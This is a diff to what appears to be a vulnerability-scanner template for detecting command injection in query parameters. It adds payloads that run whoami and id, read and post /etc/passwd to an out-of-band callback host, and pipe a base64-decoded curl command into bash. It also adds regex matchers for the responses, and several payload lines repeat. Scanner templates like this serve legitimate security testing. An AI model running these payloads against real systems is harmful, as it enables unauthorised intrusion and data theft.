@@ -15,6 +15,7 @@ info:
 
 variables:
   marker: "{{interactsh-url}}"
+  cmdpayload: "curl http://{{interactsh-url}}"
 
 requests:
   - method: GET
@@ -35,6 +36,17 @@ requests:
         - "|| nslookup {{marker}} ||"
         - "& nslookup {{marker}} &"
         - "%0anslookup {{marker}}%0a"
+        - "curl${IFS}$(whoami).{{marker}}"
+        - "curl${IFS}{{marker}}?$(whoami)"
+        - "echo${IFS}{{base64(cmdpayload)}}|base64${IFS}-d|bash"
+        - "%0a ping -i {{marker}} %0a"
+        - "curl${IFS}{{marker}}?$(whoami)"
+        - "%2 -n 21 {{marker}}||`ping -c {{marker}}` #' |ping -n {{marker}}||`ping -c 21 {{marker}}` #\" |ping -n {{marker}}"
+        - "%0a ping -i {{marker}} %0a"
+        - "curl${IFS}{{marker}}?$(whoami)"
+        - "1;system('cat%20/etc/passwd')"
+        - "1;system('id')"
+        - "|%20curl%20-d%20@/etc/passwd%20{{marker}}"
 
     fuzzing:
       - part: query
@@ -51,3 +63,9 @@ requests:
         words:
           - "dns"
           - "http"
+
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0:'
+          - 'uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)'
